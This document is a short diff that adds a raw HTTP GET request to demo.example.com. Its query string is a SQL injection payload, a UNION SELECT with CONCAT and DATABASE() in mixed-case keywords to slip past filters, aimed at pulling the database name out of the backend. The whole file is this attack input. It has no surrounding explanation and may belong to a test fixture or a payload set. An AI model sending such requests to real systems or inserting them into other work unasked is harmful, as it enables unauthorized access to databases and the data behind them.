@@ -1,0 +1,4 @@
+GET /a?id=1%20uNiOn%20SeLeCt%20CoNcAt(0X7e,DaTaBaSe(),0X7e) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
